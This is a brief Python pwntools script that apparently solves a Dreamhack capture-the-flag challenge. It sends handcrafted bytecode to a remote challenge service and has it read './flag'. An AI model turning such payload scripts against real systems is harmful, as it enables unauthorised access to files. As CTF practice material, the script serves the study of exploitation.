from pwn import *

context.log_level = 'debug'

p = remote("host3.dreamhack.games", 23039)

first = b'\x01\x01\x00\x01\x04\x06\x01\x02\x00\x08\x02\x01'
second = b'\x01\x02\x00\x01\x01\x00\x08\x01\x01'
third = b'\x01\x04\xff\x01\x02\x00\x08\x02\x01'
forth = b'\x01\x01\x01\x08\x04\x01'

p.sendlineafter(b"Send your rudolph start code: ", first+second+third+forth)

p.sendlineafter(b"[+] sys, a = read(a, b, c)\n", b"./flag")

p.interactive()
